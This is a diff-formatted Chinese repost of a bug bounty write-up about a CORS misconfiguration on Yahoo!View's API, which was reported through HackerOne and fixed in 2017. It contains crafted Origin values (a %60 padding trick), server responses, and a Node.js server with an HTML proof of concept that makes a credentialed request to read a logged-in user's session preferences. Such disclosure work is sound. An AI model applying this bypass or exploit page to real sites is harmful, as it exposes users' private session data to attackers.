@@ -1,0 +1,40 @@
+本文讲述了作者发现雅虎电视社区娱乐网Yahoo!View的漏洞，由于Yahoo!View存在不规范的CORS方式，允许远程攻击者绕过其中的同源策略，通过特制请求绕过拟定页面内容限制，获取相应的目标主机返回响应。
+最近，HackerOne开始举办第二届“Hack The World”比赛，由于之前我听说雅虎（Yahoo）的漏洞赏金项目非常不错，而且测试范围较大，所以就此机会，我打算认真地来搞搞雅虎的漏洞。经过几番周折，我找到了关于雅虎my.yahoo.com网站的几个小漏洞，也赚了点小钱，之后，我打算测试一下雅虎的电视社区娱乐网Yahoo!View。我先对https://view.yahoo.com/进行了一些浏览和请求分析，经过2分多钟对网站各种形式的点击和提交测试之后，我决定上Burp Suite利器。
+CORS策略
+通过Burp Suite被动监测功能发现，网站还对API https://api.view.yahoo.com发起请求，另外还存在跨域资源共享（CORS）策略。根据Mozilla开发者网络文档介绍，CORS使用附加HTTP头的方式，允许用户端获得同一服务器不同域资源的访问权限，它定义了在跨域访问资源时浏览器和服务器之间的通信机制。
+当浏览器实施同源策略（Same-Origin）时，它只接收AJAX方式对同源资源的数据获取请求，而跨域资源共享（CORS）策略则允许在指定站点外进行数据共享。
+Burp测试
+在Burp中最开始的API请求如下：
+GET /api/session/preferences HTTP/1.1 Host: api.view.yahoo.com ------- snip ------- origin: https://view.yahoo.com
+服务端响应如下：
+HTTP/1.1 200 OK Content-Type: application/json; charset=utf-8 ------- snip ------- Access-Control-Allow-Credentials: true Access-Control-Allow-Origin: https://view.yahoo.com
+由于服务端对origin端有响应且允许请求带有验证信息（Access-Control-Allow-Credentials）的设置为True，这样一来，我们就能从其验证信息（如cookie）中窃取敏感信息了。
+首先，我尝试向API发送一个名为sxcurity.pro的请求源：
+随后，服务端响应中不包含Allow-Origin and Allow-Credentials；接下来，我尝试向API发送一个名为view.sxcurity.pro的请求源：
+可还是没有任何响应；我突发奇想，能不能用view.yahoo.com.sxcurity.pro作请求源呢？：
+但，还是没Access-Control-Allow-Credentials或Access-Control-Allow-Origin响应，请求源变化为view.yahoo.comsxcurity.pro也无济于事。正当我要放弃时，我想到了同时对两个请求源发起请求：
+出乎意料，服务端竟然有了响应：
+HTTP/1.1 200 OK Content-Type: application/json; charset=utf-8 ------- snip ------- Access-Control-Allow-Credentials: true Access-Control-Allow-Origin: https://view.yahoo.com sxcurity.pro
+我很好奇，试图想出一种方法，来把它变为一个有效的请求域名以便进行后期利用，我尝试向两个域名之间填充一些字符，以查看服务端的响应情况，如：
+服务端响应如下：
+HTTP/1.1 200 OK Content-Type: application/json; charset=utf-8 ------- snip ------- Access-Control-Allow-Credentials: true Access-Control-Allow-Origin: https://view.yahoo.com%sxcurity.pro
+虽然有所响应，但由于请求源的域名无效，还是不能利用。
+峰回路转
+在一番请教之后，我的一个朋友告诉我，可以参考他在HackerOne提交过的一个漏洞，他在其中使用了URL编码符%60作为填充符，能有效绕过目标网站CORS策略，因此我豁然开朗，也在此利用%60作为填充符来试试：
+这里竟然也能奏效：
+Access-Control-Allow-Credentials: true Access-Control-Allow-Origin: http://view.yahoo.com%60cdl.sxcurity.pro
+于是乎，我在我的亚马逊 Route 53上设置了相应的通配符域名，打开Firefox浏览http://view.yahoo.com%60cdl.hack-r.be，不行，这....，由于不同浏览器保护策略不同，用Chrome、IE、Edge也都不行！用Mac的Safari竟然可以！！，虽然Apache会把它误认为是一个服务端错误。
+随后，我想到了用NodeJS和index.html的配合来实现漏洞利用，NodeJS的server.js如下：
+const http = require('http') const port = 6299 const fs = require("fs"); const requestHandler = (request, response) => { fs.readFile("index.html", function(err, data){ response.writeHead(200, {'Content-Type': 'text/html'}); response.write(data); response.end(); }); } const server = http.createServer(requestHandler) server.listen(port, (err) => { if (err) { return console.log('[+] ruh roh! something went wrong :(', err) } console.log(`[+] server is listening on port ${port}`) })
+index.html如下：
+<!DOCTYPE html> <html> <head><title>CORS</title></head> <body> <center> <h2>Yahoo CORs Exploit</h2> <textarea rows="10" cols="60" id="pwnz"> </textarea><br> <button type="button" onclick="cors()">Exploit</button> </div> <script> function cors() { var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.readyState == 4 && this.status == 200) { document.getElementById("pwnz").innerHTML = this.responseText; } }; xhttp.open("GET", "http://api.view.yahoo.com/api/session/preferences", true); xhttp.withCredentials = true; xhttp.send(); } </script>
+最终，可以成功通过浏览http://view.yahoo.com%60cdl.hack-r.be，获取到api.view.yahoo.com的一些相关信息。
+PoC视频
+http://v.youku.com/v_show/id_XMzI3MDY4OTgyOA==.html
+漏洞报送过程
+10/24/2017 通过HackerOne向Yahoo报送漏洞
+10/27/2017 Yahoo分类漏洞后向我奖励$100美金
+11/20/2017 Yahoo修复漏洞
+12/1/2017 又向我奖励$400美金和额外$100美金的PoC奖赏
+尽管这只是一个小洞，但也让我从中学到了一些经验，并体会到了挖洞乐趣。
+*参考来源：sxcurity，freebuf小编clouds编译，转载请注明来自FreeBuf.COM
